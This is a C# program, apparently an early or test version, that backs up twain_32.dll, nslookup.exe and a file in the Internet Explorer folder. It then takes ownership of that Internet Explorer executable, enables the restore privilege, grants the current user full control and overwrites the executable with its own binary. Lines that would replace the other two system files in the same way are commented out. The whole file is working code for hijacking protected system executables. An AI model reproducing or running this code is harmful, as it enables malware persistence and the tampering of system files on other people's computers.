using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace voileapp
{
    class Program
    {
        static void Main(string[] args)
        {
            
            char dirSeparator = Path.DirectorySeparatorChar;
            String sysRoot = Environment.ExpandEnvironmentVariables("%SystemRoot%");
            String sysDir = Environment.SystemDirectory;
            String programFilesDir = Environment.ExpandEnvironmentVariables("%ProgramFiles%");
            String winUserName = Environment.UserName;
            String winDomainName = Environment.UserDomainName;
            String pathToExe = System.Reflection.Assembly.GetEntryAssembly().Location;

            StringBuilder backupPath = new StringBuilder("C:").Append(dirSeparator).Append("TestBackup");
            String twain32Name = "twain_32.dll";
            String nslookupName = "nslookup.exe";
            String iexploreName = "test.exe";//"iexplore.exe";
            String iexploreDir = "Internet Explorer";
            
            StringBuilder pathToTwain32 = new StringBuilder(sysRoot).Append(dirSeparator).Append(twain32Name);
            StringBuilder pathToNslookup = new StringBuilder(sysDir).Append(dirSeparator).Append(nslookupName);
            StringBuilder pathToIexplore = new StringBuilder(programFilesDir).Append(dirSeparator).Append(iexploreDir)
                .Append(dirSeparator).Append(iexploreName);
            
            Console.WriteLine("Hey");
            
            Directory.CreateDirectory(backupPath.ToString());
            backupPath.Append(dirSeparator);
            File.Copy(pathToTwain32.ToString(), backupPath.ToString() + twain32Name, true);
            File.Copy(pathToNslookup.ToString(), backupPath.ToString() + nslookupName, true);
            File.Copy(pathToIexplore.ToString(), backupPath.ToString() + iexploreName, true);
            Console.WriteLine("Backups created");


            //File.Copy(pathToExe, pathToTwain32.ToString(), true);
            //File.Copy(pathToExe, pathToNslookup.ToString(), true);

            
            FileSystemAccessRule rule = new FileSystemAccessRule(winUserName, FileSystemRights.FullControl, AccessControlType.Allow);
            FileSecurity fileSecurity = File.GetAccessControl(pathToIexplore.ToString());

            var sid = fileSecurity.GetOwner(typeof(SecurityIdentifier));
            var backupAccount = sid.Translate(typeof(NTAccount));
            Console.WriteLine($"Owner {backupAccount.ToString()} backed up");

            var myNTAccount = new NTAccount(winDomainName, winUserName);
            fileSecurity.SetOwner(myNTAccount);
            Console.WriteLine($"My account name: {myNTAccount.ToString()}");

            UnmanagedCode.GiveRestorePrivilege();
            Console.WriteLine("Restore privilege granted");

            File.SetAccessControl(pathToIexplore.ToString(), fileSecurity);
            Console.WriteLine("Owner successfully changed");


            fileSecurity.SetAccessRule(rule);
           
            File.SetAccessControl(pathToIexplore.ToString(), fileSecurity);
            Console.WriteLine($"Access to file {iexploreName} granted for user {winUserName}");
            
            File.Copy(pathToExe, pathToIexplore.ToString(), true);
            Console.WriteLine("Executives replaced");
            /*
            fileSecurity.RemoveAccessRule(rule);
            File.SetAccessControl(pathToIexplore.ToString(), fileSecurity);
            Console.WriteLine("Access rights reverted back to default state");

            fileSecurity.SetOwner(backupAccount);
            File.SetAccessControl(pathToIexplore.ToString(), fileSecurity);
            Console.WriteLine("Owner reverted back");
            */
        }
    }
}
